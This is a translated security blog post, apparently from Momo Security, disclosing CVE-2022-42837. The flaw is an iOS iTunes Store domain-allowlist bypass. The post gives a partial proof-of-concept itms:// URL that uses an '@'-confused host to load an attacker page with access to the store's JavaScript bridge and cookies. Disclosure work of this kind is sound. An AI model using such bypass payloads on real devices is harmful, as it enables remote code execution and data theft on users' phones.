# 陌陌安全获Apple致谢：CVE-2022-42837 - iTunes Store的漏洞

##### 翻译声明
本文为翻译文章，具体表达及含义以原文为准。

首先，我们要向我们的同学[@dwj1210](https://github.com/dwj1210)表示祝贺👏。作为全程见证该漏洞从发现到最终形成文章的一员，我想说，这次漏洞的发现非常偶然。几天前，在我们为WMCTF准备题目时，dwj同学突然提到他可能找到了一个远程代码执行（RCE）漏洞。在完成出题后，我们开始了向Apple提交漏洞并协助其修复的过程，从而有了这篇文章。以下是dwj同学对此事的叙述：

我们将这个漏洞称为“iTunes Store之殇”，因为iTunes Store应用程序中的任意JavaScript代码执行问题已经被修补了多次。

此漏洞源于Safari浏览器中加载的一个恶意页面。当你点击某个URL Schemes或Universal Links链接时，可以通过特定URL调用指定的应用程序，并传递攻击载荷。例如，在Safari浏览器中输入`sms://`可以调起信息应用，并弹出询问框确认是否打开。然而，一些内置的Apple应用程序被Safari信任，无需用户同意即可直接启动，这些应用程序的信息被硬编码在系统代码中。

早在2014年的Pwn2Own大会上，韩国黑客lokihardt利用了一个特殊的URL，在iTunes Store中打开了任意网页。而`itms://`正是iTunes Store注册的URL Scheme之一。由于存在应用程序白名单机制，因此无需请求用户许可就可以直接在iTunes Store内打开恶意网页。结合使用Use-After-Free（UAF），实现了沙箱逃逸和任意代码执行。

之后，苹果增加了域名限制，只有当URL的域名满足trustedDomains列表时才会被允许打开。不过，lokihardt随后又发现了一个可信域上的DOM XSS漏洞，再次成功利用。

直到2020年天府杯竞赛期间，cc师傅展示了一整套完整的exploit链，远程攻破了运行iOS 14.2系统的iPhone 11设备。这一链条的第一步依然是通过Safari访问iTunes Store，但不涉及内存破坏或shellcode执行。而是利用特殊构造的URL绕过域名白名单验证，执行任意JavaScript代码，触发XSS弹出计算器。

对这部分内容感兴趣的朋友可以直接参考cc师傅的文章《CVE-2021-1748：从客户端XSS到弹出计算器》。

今天要讨论的内容仍然是关于iTunes Store中的任意JavaScript代码执行问题。iTunes Store内部有一段逻辑，当传入的URL Scheme包含特定参数时，会忽略原始URL中的主机名部分，直接加载由参数指定的新URL。例如：
```
itms://&url=http://www.apple.com
```

启动时，iTunes Store会从该URL获取一个XML文件，其中trustedDomains字段预设了Apple的信任域名。只有当页面主机名与trustedDomains列表中的后缀匹配时，才允许在iTunes Store中打开。

域名验证发生在`-[ISURLBag urlIsTrusted:]`函数里，但这里存在缺陷。如果传入如下格式的URL：
```
http://@www.apple.com:@www.hacker.com
```
iOS系统会通过`-[NSURL host]`函数识别主机名为`www.apple.com`，但实际上打开的是`www.hacker.com`。据了解，Android平台也存在类似问题。

因此，我们可以构建如下形式的URL Scheme来绕过域名检查，从而打开任意网页：
```
itms://&url=http%3A%2F%2F%40www.apple.com%3A%40172.16.136.27:1024%2Fpoc.html
```

目前，该漏洞已在iOS 16.2版本中得到修复，不确定最早受影响的版本，但估计iOS 9至iOS 16.1.2均受到影响。考虑到影响范围较大，提供的PoC已省略了一些关键参数。

iTunes Store使用的SUWebView通过JavaScript桥接注入了许多功能；SUWebView将SUScriptInterface类的方法暴露给JavaScript上下文。这些API位于全局作用域内的iTunes命名空间中。

此外，在此WebView中向任何域名发送请求时，都会携带部分iTunes Store cookie信息。

最后，附上一个经典的计算器弹出演示：